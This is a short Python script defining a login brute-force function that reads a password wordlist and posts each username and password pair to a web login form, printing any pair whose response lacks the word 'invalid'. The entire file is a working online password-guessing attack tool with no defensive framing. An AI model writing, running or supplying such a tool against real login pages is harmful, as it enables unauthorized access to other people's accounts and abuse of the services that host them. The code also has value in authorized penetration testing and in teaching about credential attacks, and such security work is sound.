import requests
from rich.console import Console

console = Console()

def login_bruteforce(url, user_field, pass_field, username, wordlist):
    try:
        with open(wordlist, "r") as f:
            passwords = [line.strip() for line in f]

        for password in passwords:
            data = {user_field: username, pass_field: password}
            response = requests.post(url, data=data)

            if "invalid" not in response.text.lower() and response.status_code == 200:
                console.print(f"[bold green][+] Success:[/bold green] {username}:{password}")
                return

            console.print(f"[red][-] Failed:[/red] {username}:{password}")
        
        console.print("[yellow]Bruteforce complete – no valid credentials found.[/yellow]")

    except Exception as e:
        console.print(f"[red]Error:[/red] {e}")